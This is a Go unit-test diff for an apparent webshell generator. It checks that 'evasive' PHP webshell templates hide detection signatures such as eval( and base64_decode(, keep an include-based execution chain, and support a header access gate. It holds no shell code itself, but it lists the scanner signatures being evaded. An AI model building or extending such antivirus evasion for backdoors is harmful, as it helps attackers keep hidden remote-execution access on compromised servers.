@@ -140,3 +140,34 @@ func TestGenerateShellMarks(t *testing.T) {
 		t.Fatal("jspx wrap missing")
 	}
 }
+
+func TestEvasiveTemplates(t *testing.T) {
+	// 功能等价：协议 key 派生不变（aes/xor 与基础版行为一致由靶场回归保证；
+	// 这里静态断言免杀产物的特征形态）。
+	for _, enc := range []string{"raw", "aes", "xor"} {
+		code, err := GenerateShellEvasive("php", enc, "pw123", GateOpts{}, EvasiveOpts{Enabled: true})
+		if err != nil {
+			t.Fatal(enc, err)
+		}
+		// 明文特征不应整体出现（拼接拆散）
+		for _, sig := range []string{"eval(", "base64_decode(", "openssl_decrypt(", "file_get_contents('php://input')"} {
+			if strings.Contains(code, sig) {
+				t.Errorf("%s evasive 泄露明文特征 %q", enc, sig)
+			}
+		}
+		// 功能要素仍在：include 临时文件执行链（eval 是语言构造器不可字符串调用）
+		if !strings.Contains(code, "include(") || !strings.Contains(code, "'<?p'.'hp '") {
+			t.Errorf("%s evasive 缺 include 执行链", enc)
+		}
+	}
+	// gate 内联进同一 php 块
+	code, _ := GenerateShellEvasive("php", "aes", "p", GateOpts{Header: "X-G", Value: "1"}, EvasiveOpts{Enabled: true})
+	if !strings.Contains(code, "HTTP_X_G") || !strings.Contains(code, "include(") {
+		t.Fatal("evasive+gate 合并失败")
+	}
+	// 未开启时走原版
+	base, _ := GenerateShellEvasive("php", "raw", "p", GateOpts{}, EvasiveOpts{})
+	if !strings.Contains(base, "eval($p);") && !strings.Contains(base, "eval(") {
+		t.Fatal("未开启 evasive 应为原版模板")
+	}
+}
